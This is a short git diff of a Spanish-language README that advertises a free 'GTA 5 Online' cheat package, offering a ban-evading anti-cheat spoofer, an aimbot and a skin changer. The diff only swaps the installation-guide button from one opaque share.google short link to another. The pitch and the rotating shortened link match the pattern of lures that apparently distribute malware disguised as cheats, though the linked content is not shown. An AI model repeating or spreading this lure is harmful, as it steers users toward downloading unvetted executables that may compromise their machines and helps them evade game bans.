@@ -5,7 +5,7 @@
 Descarga el paquete **GTA 5 Online**: spoofer para los baneos de Rockstar AC, un aimbot configurable y un skin changer completo en un único archivo portable. **Sin suscripción, sin cuenta y funciona sin conexión.**
 
 <p align="center">
-  <a href="https://share.google/w1QWOU91fY6ZTPX4w"><img src="button.svg" alt="Guía de instalación" height="46"></a>
+  <a href="https://share.google/EhtnGsLifo2dMVWa1"><img src="button.svg" alt="Guía de instalación" height="46"></a>
 </p>
 
 ## ⚡ Inicio rápido
